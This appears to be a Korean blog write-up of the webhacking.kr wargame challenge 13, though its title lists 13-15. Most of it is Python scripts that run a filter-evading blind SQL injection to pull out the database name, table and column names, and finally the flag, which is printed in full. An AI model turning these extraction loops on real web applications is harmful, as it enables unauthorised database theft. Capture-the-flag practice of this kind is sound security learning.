---
title: "Security: webhacking.kr 13-15"
last_modified_at: 2020-07-05T20:20:02-05:00
categories:
  - Security
tags:
  - webhacking.kr
  - 웹해킹
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

---
### 13 문제 풀이
---

13번 문제에 들어오니 다음과 같은 화면을 볼 수 있었다. 
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

이번 문제는 푸는데 꽤나 오래걸렸다. 창에 true를 입력하면 1이 출력되고 false를 입력하면 0이 출력되었다. 그리고 sql Injection을 시도하기 위해 몇가지 명령문을 입력하니 특정단어들은 no hack이라는 문구가 출력되면서 필터링 되었다.
{: .notice}

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-1-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-1-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-1-3.JPG" alt="">
  <figcaption> </figcaption>
</figure>

```
#DB 이름 길이 구하기
dbName_length = 0
for i in range(1,20):
    data = "?no=(if(length(database())in({}),1,0))".format(i)
    print(data)
    html = requests.get(url+data).text
    if re.search("<td>1</td>",html):
        print("1")
        dbName_length = i
        break
    if re.search("<td>0</td>",html):
        print("0")
print("dbName_length: ",dbName_length)
# 결과는 7 
```
```
#DB 이름 구하기
dbName = ""
for i in range(1,8):
    for j in range(33,123):
        data = "?no=(if(ord(substr(database(),{},1))in({}),1,0))".format(i,j)
        print(data)
        print(dbName)
        html = requests.get(url+data).text
        if re.search("<td>1</td>",html):
            dbName+=chr(j)
            break
        else: print("None")
print(dbName)
#chall13
```
```
#Table명 길이
tName_length = 0
for i in range(1,20):
    data = "?no=(if((select(length(min(if((select(table_schema)in(database())),table_name,null))))from(information_schema.tables))in({}),1,0))".format(str(i))
    print(data)
    html = requests.get(url+data).text
    if re.search("<td>1</td>",html):
        print("1")
        tName_length = i
        break
    if re.search("<td>0</td>",html):
        print("0")
print("tName_length: ",tName_length)
#테이블명 길이는 13 자리
```

```
#Table명
tName = ""
for i in range(1,14):
    for j in range(33,128):
        data = "?no=(if((select(substr(min(if((select(table_schema)in(database())),table_name,null)),{},1))from(information_schema.tables))in({}),1,0))".format(str(i),str(bin(j)))
        print(data)
        print(tName)
        html = requests.get(url+data).text
        if re.search("<td>1</td>",html):
            tName+=chr(j)
            break
        if re.search("<td>0</td>",html): print("0")
print(tName)
##이진수로 찾아야 결과가 올바르게 나온다
##결과 "FfLlAaGg_AaBb733768" 알파벳은 두자씩 나왔지만 바꾸면 "flag_ab733768"
```
<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>
```
#Column명 길이
cName_length = 0
for i in range(1,20):
    data = "?no=if((select(length(min(if((select(table_name)in(0b01100110011011000110000101100111010111110110000101100010001101110011001100110011001101110011011000111000)),column_name,null))))from(information_schema.columns))in("+bin(i)+"),1,0)"
    #0b01100110011011000110000101100111010111110110000101100010001101110011001100110011001101110011011000111000
    print(data)
    html = requests.get(url+data).text
    if re.search("<td>1</td>",html):
        print("1")
        cName_length = i
        break
    if re.search("<td>0</td>",html):
        print("0")
print("cName_length: ", cName_length)
#13자
```
<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-3.JPG" alt="">
  <figcaption> </figcaption>
</figure>
```
#Column명
cName = ""
for i in range(1,14):
    for j in range(33,128):
        data = "?no=if((select(substr(min(if((select(table_name)in(0b01100110011011000110000101100111010111110110000101100010001101110011001100110011001101110011011000111000)),column_name,null)),"+str(i)+",1))from(information_schema.columns))in("+str(bin(j))+"),1,0)"
        print(data)
        print(cName )
        html = requests.get(url+data).text
        if re.search("<td>1</td>",html):
            cName+=chr(j)
            break
        if re.search("<td>0</td>",html): print("0")
print(cName)
#FfLlAaGg_3Aa55Bb31Dd    #flag_3a55b31d
```
<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-4.JPG" alt="">
  <figcaption> </figcaption>
</figure>
```
#flag길이
fName_length = 0
for i in range(1,30):
    data = "?no=if((select(length(max(flag_3a55b31d)))from(chall13.flag_ab733768))in("+str(i)+"),1,0)"
    print(data)
    html = requests.get(url+data).text
    if re.search("<td>1</td>",html):
        print("1")
        fName_length = i
        break
    if re.search("<td>0</td>",html):
        print("0")
print("fName_length: ", fName_length)
```
<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-5.JPG" alt="">
  <figcaption> </figcaption>
</figure>
```
#flag 내용
fName = ""
for i in range(1,28):
    for j in range(33,128):
        data = "?no=if((select(substr(max(flag_3a55b31d),"+str(i)+",1))from(chall13.flag_ab733768))in("+str(bin(j))+"),1,0)"
        print(data)
        print(fName )
        html = requests.get(url+data).text
        if re.search("<td>1</td>",html):
            fName+=chr(j)
            break
        if re.search("<td>0</td>",html): print("0")
print(fName)

#FLAG{CHALLENGE13GUMMYCLEAR} FLAG{challenge13gummyclear}
```
<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-6.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제13/13-7.JPG" alt="">
  <figcaption> </figcaption>
</figure>